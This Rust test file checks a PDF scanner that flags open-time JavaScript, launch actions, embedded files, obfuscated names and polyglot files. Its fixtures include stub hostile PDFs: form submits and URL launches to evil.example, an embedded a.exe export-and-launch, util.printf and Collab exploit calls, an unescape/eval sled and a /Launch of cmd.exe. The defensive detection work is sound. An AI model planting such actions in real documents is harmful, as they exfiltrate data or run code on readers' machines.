use super::*;
use crate::checks::documents::{ids, scan_bytes};

#[test]
fn an_open_action_alone_is_a_page_to_open_at() {
    let plain = b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >> endobj\n%%EOF\n";
    assert!(scan_bytes("a.pdf", plain).is_empty());
}

#[test]
fn javascript_on_open_is_graded_by_what_it_does() {
    // An alert stays inside the document: a warning that quotes it.
    let alert =
        b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", alert);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(got[0].note.contains("runs when the file is opened but stays inside the document"), "{}", got[0].note);
    assert!(got[0].note.contains("`app.alert(1)`"), "{}", got[0].note);
    // A URL, a server, mail, the disk: out of the document, a fail that says how.
    for (script, why) in [
        ("app.launchURL(\"https://evil.example/x\", true)", "opens a URL"),
        ("this.submitForm({cURL: \"https://evil.example/c\"})", "sends form data"),
        ("this.exportDataObject({cName: \"a.exe\", nLaunch: 2})", "writes an embedded file"),
        ("app['mailMsg'](true)", "sends mail"),
        ("util.printf(\"%45000f\", 1)", "util.printf"),
        ("Collab.collectEmailInfo({subj: \"\", msg: \"x\"})", "Collab"),
    ] {
        let pdf = format!(
            "%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS ({script}) >> >> endobj\n%%EOF"
        );
        let got = scan_bytes("a.pdf", pdf.as_bytes());
        assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{script}: {got:?}");
        assert!(got[0].note.contains(why), "{script}: {}", got[0].note);
        assert!(got[0].note.contains(&format!("`{}", &script[..20])), "quoted: {}", got[0].note);
    }
    // A decoder over a long escaped payload is a shellcode sled.
    let sled = format!(
        "%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (var p = unescape(\"{}\"); eval(p);) >> >> endobj\n%%EOF",
        "%u4141".repeat(20)
    );
    let got = scan_bytes("a.pdf", sled.as_bytes());
    assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
    assert!(got[0].note.contains("decodes a long escaped payload"), "{}", got[0].note);
    assert!(got[0].note.ends_with("…`"), "a long line is cut: {}", got[0].note);
    let short = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (eval(\"1+1\")) >> >> endobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("a.pdf", short)), [("DOC-JAVASCRIPT", false)], "eval over nothing much");
    // Scripts off the open path warn as before, with the first quoted.
    let js_only = b"%PDF-1.7\n1 0 obj << /Type /Annot /A << /S /JavaScript /JS (calc()) >> >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", js_only);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)]);
    assert!(got[0].note.ends_with("the first reads `calc()`"), "{}", got[0].note);
    // A fillable worksheet: field scripts and a go-to-page open action. Not on open.
    let form = b"%PDF-1.6\n1 0 obj << /Type /Catalog /OpenAction 3 0 R /AcroForm 4 0 R >> endobj\n3 0 obj << /S /GoTo /D [5 0 R /Fit] >> endobj\n6 0 obj << /FT /Tx /AA << /F << /S /JavaScript /JS (AFNumber_Format(2)) >> /K << /S /JavaScript /JS (AFNumber_Keystroke(2)) >> >> >> endobj\n%%EOF";
    let got = scan_bytes("worksheet.pdf", form);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(got[0].note.contains("doesn't run it"), "{}", got[0].note);
    assert!(got[0].note.contains("`AFNumber_Format(2)`"), "{}", got[0].note);
}

#[test]
fn document_level_scripts_are_read_through_the_name_tree() {
    // this.print() in the names tree, by reference: inside the document.
    let tree = b"%PDF-1.6\n1 0 obj << /Type /Catalog /Names << /JavaScript 7 0 R >> /OpenAction 3 0 R >> endobj\n7 0 obj << /Names [(init) 8 0 R] >> endobj\n8 0 obj << /S /JavaScript /JS (this.print()) >> endobj\n%%EOF";
    let got = scan_bytes("tree.pdf", tree);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(got[0].note.contains("`this.print()`"), "{}", got[0].note);
    // One level of /Kids, and an open action by reference, both reaching out.
    let kids = b"%PDF-1.6\n1 0 obj << /Type /Catalog /Names << /JavaScript 7 0 R >> >> endobj\n7 0 obj << /Kids [6 0 R] >> endobj\n6 0 obj << /Names [(a) 8 0 R] >> endobj\n8 0 obj << /S /JavaScript /JS (this.getURL(\"https://x.y/\")) >> endobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("kids.pdf", kids)), [("DOC-JS-ON-OPEN", true)]);
    let by_ref = b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 12 0 R >> endobj\n2 0 obj << /S /GoTo >> endobj\n12 0 obj << /S /JavaScript /JS (app.openDoc(\"x.pdf\")) >> endobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("ref.pdf", by_ref)), [("DOC-JS-ON-OPEN", true)], "an open action by reference");
    // TCPDF's empty names-tree entry does nothing, so it is nothing.
    let empty = b"%PDF-1.7\n1 0 obj << /Type /Catalog /Names << /JavaScript 9 0 R >> >> endobj\n9 0 obj << /Names [(EmbeddedJS) 10 0 R] >> endobj\n10 0 obj << /S /JavaScript /JS () >> endobj\n%%EOF";
    assert!(scan_bytes("invoice.pdf", empty).is_empty());
    // ...unless other scripts were left unread.
    let mut with_fields = empty[..empty.len() - 5].to_vec();
    with_fields.extend_from_slice(
        b"11 0 obj << /FT /Tx /AA << /F << /S /JavaScript /JS (AFNumber_Format(2)) >> >> >> endobj\n%%EOF",
    );
    let got = scan_bytes("form.pdf", &with_fields);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(got[0].note.contains("is empty, and 1 other /JS reference(s)"), "{}", got[0].note);
    // A script that can't be read is not a script that is fine.
    let missing = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS 99 0 R >> >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", missing);
    assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
    assert!(got[0].note.contains("could not be read"), "{}", got[0].note);
    let lzw = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS 9 0 R >> >> endobj\n9 0 obj << /Length 3 /Filter /LZWDecode >> stream\nabc\nendstream\nendobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("a.pdf", lzw)), [("DOC-JS-ON-OPEN", true)]);
    let no_tree = b"%PDF-1.7\n1 0 obj << /Type /Catalog /Names << /JavaScript 7 0 R >> >> endobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("a.pdf", no_tree)), [("DOC-JS-ON-OPEN", true)], "a tree that isn't there");
}

#[test]
fn functions_defined_at_open_run_from_links_not_at_open() {
    // KiCad as it writes it: an inline name tree, and a pop-up menu whose
    // "http" entries launch a URL when the reader picks one. The reader's
    // choice, not the file's: a warning that says so.
    let kicad = b"%PDF-1.5\n1 0 obj << /Type /Catalog /Names 4 0 R >> endobj\n4 0 obj\n<< /JavaScript\n << /Names\n    [ (JSInit) << /Type /Action /S /JavaScript /JS (\nfunction ShM\\(aEntries\\) {\n    var aParams = [];\n    for \\(var i in aEntries\\) {\n        aParams.push\\({ cName: aEntries[i][0], cReturn: aEntries[i][1] }\\)\n    }\n    var cChoice = app.popUpMenuEx.apply\\(app, aParams\\);\n    if \\(cChoice != null && cChoice.substring\\(0, 1\\) == '#'\\) this.pageNum = parseInt\\(cChoice.slice\\(1\\)\\);\n    else if \\(cChoice != null && cChoice.substring\\(0, 4\\) == 'http'\\) app.launchURL\\(cChoice\\);\n}\n) >> ]\n >>\n>>\nendobj\n5 0 obj << /Type /Annot /Subtype /Link /A << /Type /Action /S /JavaScript /JS (ShM\\([[\"Reference = R1\"]]\\);) >> >> endobj\n%%EOF";
    let got = scan_bytes("schematic.pdf", kicad);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(got[0].note.contains("only defines functions for links and fields to call; ShM() opens a URL (app.launchURL) when called: `function ShM(aEntries) {`"), "{}", got[0].note);
    // The same function with a page-open action that calls it: that runs at open.
    let mut called = kicad[..kicad.len() - 5].to_vec();
    called.extend_from_slice(b"6 0 obj << /Type /Page /AA << /O << /S /JavaScript /JS (ShM([[\"x\", \"http://evil.example/\"]])) >> >> >> endobj\n%%EOF");
    let got = scan_bytes("schematic.pdf", &called);
    assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
    assert!(got[0].note.contains("calls ShM(), defined at open, which opens a URL"), "{}", got[0].note);
    // A page-open action that reaches out on its own.
    let page_open = b"%PDF-1.7\n1 0 obj << /Type /Page /AA << /O << /S /JavaScript /JS (this.submitForm(\"https://x.y/\")) >> /C << /S /JavaScript /JS (app.alert(2)) >> >> >> endobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("a.pdf", page_open)), [("DOC-JS-ON-OPEN", true)]);
    let page_close = b"%PDF-1.7\n1 0 obj << /Type /Page /AA << /C << /S /JavaScript /JS (this.submitForm(\"https://x.y/\")) >> >> >> endobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("a.pdf", page_close)), [("DOC-JAVASCRIPT", false)], "a close action is an event");
    // Defining and calling in one script is running it.
    let runs = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (function go(u) { app.launchURL(u); } go(\"http://evil.example/\");) >> >> endobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("a.pdf", runs)), [("DOC-JS-ON-OPEN", true)]);
    assert_eq!(defined_functions("function a(){} function b(x){ if(x){ } }"), Some(vec!["a".into(), "b".into()]));
    assert_eq!(defined_functions("function a(){ var s = \"}\"; /* } */ } // }\n"), Some(vec!["a".into()]));
    assert_eq!(defined_functions("function a(){}; a();"), None);
    assert_eq!(defined_functions("var x = 1; function a(){}"), None);
    assert_eq!(defined_functions("function a(){"), None, "unbalanced");
    assert_eq!(defined_functions("functionX(){}"), None);
    // TCPDF as it writes it: a bare object number for the tree and a UTF-16
    // byte-order mark with nothing after it. Nothing.
    let tcpdf = b"%PDF-1.7\n15 0 obj\n<<\n/Names [(EmbeddedJS) 16 0 R ]\n>>\nendobj\n16 0 obj\n<<\n/S /JavaScript\n/JS (\xfe\xff)\n>>\nendobj\n19 0 obj\n<< /Type /Catalog /Names << /JavaScript 15 >> /OpenAction [6 0 R /XYZ null null 0.6] >>\nendobj\n%%EOF";
    assert!(scan_bytes("invoice.pdf", tcpdf).is_empty(), "{:?}", scan_bytes("invoice.pdf", tcpdf));
}

#[test]
fn scripts_come_as_streams_hex_and_utf16() {
    // KiCad's component-property pop-ups: a zlib-wrapped FlateDecode stream by
    // reference from a names-tree entry. Inside the document: a warning, quoted.
    let shm: [u8; 133] = [
        0x78, 0xda, 0x55, 0xcc, 0xcd, 0x0a, 0xc2, 0x30, 0x10, 0x04, 0xe0, 0x57, 0x99, 0x63, 0x0a, 0x25, 0xe8, 0xd5,
        0xe2, 0xb1, 0xc7, 0x8a, 0x58, 0x3c, 0x85, 0x1c, 0x96, 0x90, 0xd2, 0x80, 0xdd, 0x84, 0xfc, 0x88, 0x52, 0xfa,
        0xee, 0xb6, 0xa0, 0xa2, 0x97, 0x85, 0x99, 0xf9, 0xd8, 0xa1, 0xb0, 0xc9, 0xce, 0x33, 0xfa, 0xb1, 0x13, 0xd4,
        0x72, 0x8e, 0xce, 0xa6, 0x0a, 0x33, 0xee, 0x14, 0x41, 0x67, 0x8a, 0x34, 0x25, 0x1c, 0xa1, 0x74, 0x83, 0xc1,
        0x47, 0x88, 0xad, 0x76, 0x70, 0x8c, 0x5f, 0xfb, 0x76, 0x32, 0x94, 0x34, 0x8a, 0xd9, 0x9c, 0x68, 0xb2, 0x87,
        0x2f, 0x50, 0x4e, 0xab, 0x9d, 0xae, 0x61, 0x2e, 0x36, 0x97, 0xc8, 0xff, 0xc3, 0x5e, 0x2f, 0x55, 0x83, 0x05,
        0x14, 0x82, 0x0c, 0x3e, 0x5c, 0x43, 0x67, 0xb9, 0xb4, 0x0f, 0xb9, 0xe6, 0xdb, 0x53, 0xac, 0xb7, 0xfe, 0x3c,
        0xdf, 0xd8, 0x0b, 0x5a, 0xec, 0x3c, 0x13,
    ];
    let mut kicad = b"%PDF-1.5\n1 0 obj << /Type /Catalog /Names << /JavaScript 7 0 R >> >> endobj\n7 0 obj << /Names [(EmbeddedJS) 8 0 R] >> endobj\n8 0 obj << /S /JavaScript /JS 9 0 R >> endobj\n9 0 obj << /Length 133 /Filter /FlateDecode >> stream\n".to_vec();
    kicad.extend_from_slice(&shm);
    kicad.extend_from_slice(b"\nendstream\nendobj\n%%EOF");
    let got = scan_bytes("schematic.pdf", &kicad);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(
        got[0].note.contains("`function ShM(aEntries) { var aParams = []; for (var i in aEntries)"),
        "{}",
        got[0].note
    );
    assert_eq!(
        inflate_stream(&shm, 1 << 10).map(|v| v.len()),
        Some(173),
        "the zlib header is stripped; raw DEFLATE still reads"
    );
    assert_eq!(inflate_stream(&shm[2..], 1 << 10).map(|v| v.len()), Some(173));
    // A stream with no filter is read as it is.
    let plain = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS 9 0 R >> >> endobj\n9 0 obj << /Length 11 >> stream\nthis.print()\nendstream\nendobj\n%%EOF";
    let got = scan_bytes("a.pdf", plain);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(got[0].note.contains("`this.print()`"), "{}", got[0].note);
    // Hex strings, UTF-16 with a byte-order mark, and literal escapes all decode.
    let hex = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS <FEFF0074006800690073002E007000720069006E00740028002900 3B> >> >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", hex);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(got[0].note.contains("`this.print();`"), "{}", got[0].note);
    let escaped = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert\\(\"hi \\(there\\)\"\\);\\n// line two) >> >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", escaped);
    assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
    assert!(got[0].note.contains("`app.alert(\"hi (there)\");`"), "{}", got[0].note);
    assert_eq!(literal_string(b"(a\\101\\n\\t)"), b"aA\n\t");
    assert_eq!(hex_string(b"<48 65 6C6C6F7>"), b"Hello\x70");
    assert_eq!(text_of(&[0xFF, 0xFE, b'h', 0, b'i', 0]), "hi");
    assert_eq!(quote("\n\n  var  x = 1;\nnext"), "var x = 1;");
    assert_eq!(quote(&"y".repeat(100)).chars().count(), QUOTE_LEN + 1);
    assert!(is_reference(b"12 0 R>>") && !is_reference(b"12 0 Rx") && !is_reference(b"12") && !is_reference(b"(x)"));
}

#[test]
fn launch_and_escaped_names_fail() {
    let launch = b"%PDF-1.7\n1 0 obj << /S /Launch /F (cmd.exe) >> endobj\n%%EOF";
    assert_eq!(ids(&scan_bytes("a.pdf", launch)), [("DOC-LAUNCH", true)]);
    let escaped = b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /J#61vaScript /J#53 (x) >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", escaped);
    assert!(ids(&got).contains(&("DOC-OBFUSCATED", true)), "{got:?}");
    assert!(
        ids(&got).contains(&("DOC-JAVASCRIPT", false)),
        "decoded names still count, through the reference, and `x` does nothing on its own: {got:?}"
    );
    let harmless = b"%PDF-1.7\n1 0 obj << /T#79pe /Catalog >> endobj\n%%EOF";
    assert!(scan_bytes("a.pdf", harmless).is_empty(), "an escape in a name that does nothing");
}

#[test]
fn embedded_files_forms_and_trailers_warn() {
    // Acrobat Distiller's job options ride along in its PDFs: named, so the reader can judge.
    let embedded = b"%PDF-1.7\n1 0 obj << /Type /Filespec /F (EI.joboptions) /UF (EI.joboptions) /EF << /F 2 0 R >> >> endobj\n2 0 obj << /Type /EmbeddedFile >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", embedded);
    assert_eq!(ids(&got), [("DOC-EMBEDDED", false)]);
    assert_eq!(got[0].note, "1 embedded file(s) (EI.joboptions): a PDF carrying another file");
    // The Unicode name wins over the byte one, and comes as UTF-16 hex.
    let unicode = b"%PDF-1.7\n1 0 obj << /Type /Filespec /F (r_sum_.pdf) /UF <FEFF007200E900730075006D00E9002E007000640066> /EF << /F 2 0 R >> >> endobj\n2 0 obj << /Type /EmbeddedFile >> endobj\n3 0 obj << /Type /Filespec /F (payload.exe) /EF << /F 4 0 R >> >> endobj\n4 0 obj << /Type /EmbeddedFile >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", unicode);
    assert!(got[0].note.starts_with("2 embedded file(s) (résumé.pdf, payload.exe)"), "{}", got[0].note);
    let nameless = b"%PDF-1.7\n1 0 obj << /Type /Filespec /EF << /F 2 0 R >> >> endobj\n2 0 obj << /Type /EmbeddedFile >> endobj\n%%EOF";
    assert!(scan_bytes("a.pdf", nameless)[0].note.contains("(name not found)"));
    let form = b"%PDF-1.7\n1 0 obj << /AcroForm << /XFA 2 0 R >> >> endobj\n3 0 obj << /S /SubmitForm /F (https://x.y) >> endobj\n%%EOF";
    let got = scan_bytes("a.pdf", form);
    assert_eq!(ids(&got), [("DOC-FORM", false)]);
    assert!(got[0].note.contains("an XFA form, a submit"), "{}", got[0].note);
    let mut trailer = b"%PDF-1.4\n%%EOF\n".to_vec();
    trailer.extend(std::iter::repeat_n(b'x', 5000));
    assert_eq!(ids(&scan_bytes("a.pdf", &trailer)), [("DOC-TRAILER", false)]);
}

#[test]
fn a_pdf_without_the_header_is_a_polyglot() {
    let html = b"<html><body>not a pdf</body></html>\n";
    let got = scan_bytes("report.pdf", html);
    assert_eq!(ids(&got), [("DOC-POLYGLOT", true)]);
    assert!(got[0].note.contains("markup"), "{}", got[0].note);
    let got = scan_bytes("report.pdf", b"PK\x03\x04\x14\x00");
    assert!(got[0].note.contains("a zip archive"), "{}", got[0].note);
    let got = scan_bytes("report.pdf", b"{\\rtf1\\ansi}");
    assert!(got[0].note.contains("an RTF document"), "{}", got[0].note);
    let got = scan_bytes("report.pdf", &[0u8, 1, 2, 3, 4, 5]);
    assert!(got[0].note.contains("something else"), "{}", got[0].note);
}

#[test]
fn names_count_outside_stream_data_and_inside_object_streams() {
    assert_eq!(count_names(b"/JS /JScript /JS", b"/JS"), 2);
    // Random bytes inside a compressed stream don't count (an arXiv paper
    // spelled `/JS` by chance); the same names in an inflated object stream do.
    let binary = b"%PDF-1.4\n1 0 obj << /Length 40 /Filter /FlateDecode >> stream\n\x00\xffIP/JS\x16\x10xx/AA\x01 /OpenAction /Launch\nendstream\nendobj\n%%EOF";
    assert!(scan_bytes("paper.pdf", binary).is_empty());
    // The catalog lives in a compressed object stream: `/Names << /JavaScript 3 0 R >>`.
    let mut objstm =
        b"%PDF-1.5\n5 0 obj << /Type /ObjStm /N 2 /First 8 /Filter /FlateDecode /Length 94 >> stream\n".to_vec();
    objstm.extend_from_slice(&[
        0x33, 0x54, 0x30, 0x50, 0x30, 0x52, 0x30, 0x33, 0x50, 0xb0, 0xb1, 0x51, 0xd0, 0x0f, 0xa9, 0x2c, 0x48, 0x55,
        0xd0, 0x77, 0x4e, 0x2c, 0x49, 0xcc, 0xc9, 0x4f, 0x57, 0xd0, 0xf7, 0x4b, 0xcc, 0x4d, 0x2d, 0x06, 0x4b, 0x78,
        0x25, 0x96, 0x25, 0x06, 0x27, 0x17, 0x65, 0x16, 0x94, 0x28, 0x18, 0x03, 0x35, 0x04, 0x29, 0xd8, 0xd9, 0x29,
        0xe8, 0xfb, 0x17, 0xa4, 0xe6, 0x39, 0x26, 0x97, 0x64, 0xe6, 0xe7, 0x01, 0x4d, 0x80, 0x0a, 0x82, 0x14, 0x07,
        0x2b, 0xe8, 0xbb, 0xe7, 0x87, 0xe4, 0x2b, 0xe8, 0xbb, 0x28, 0x44, 0x9b, 0x82, 0x25, 0xf4, 0xdd, 0x32, 0x4b,
        0x62, 0x81, 0xd2, 0x00,
    ]);
    objstm.extend_from_slice(b"\nendstream\nendobj\n%%EOF");
    let got = scan_bytes("hidden.pdf", &objstm);
    assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
    assert!(got[0].note.contains("object stream(s) inflated"), "{}", got[0].note);
    // "endstream" inside text is text, not a stream start.
    let stray = text_outside_streams(b"a endstream b");
    assert_eq!(stray, b"a endstream b");
}

#[test]
fn decode_names_undoes_hex_escapes_and_remembers_which_mattered() {
    let (decoded, escaped) = decode_names(b"<< /J#61vaScript /Pa#67es /J#53 (x) >>");
    assert_eq!(decoded, b"<< /JavaScript /Pages /JS (x) >>");
    assert_eq!(escaped, ["/JavaScript", "/JS"], "the names that do things, once each, not /Pages");
    let (decoded, escaped) = decode_names(b"/JS#20x");
    assert_eq!(decoded, b"/JS x", "a decoded byte stays part of the name");
    assert!(escaped.is_empty(), "so `/JS x` is not `/JS`");
    let (decoded, escaped) = decode_names(b"/Plain /A#zz");
    assert_eq!(decoded, b"/Plain /A#zz", "a # without two hex digits is left alone");
    assert!(escaped.is_empty());
}
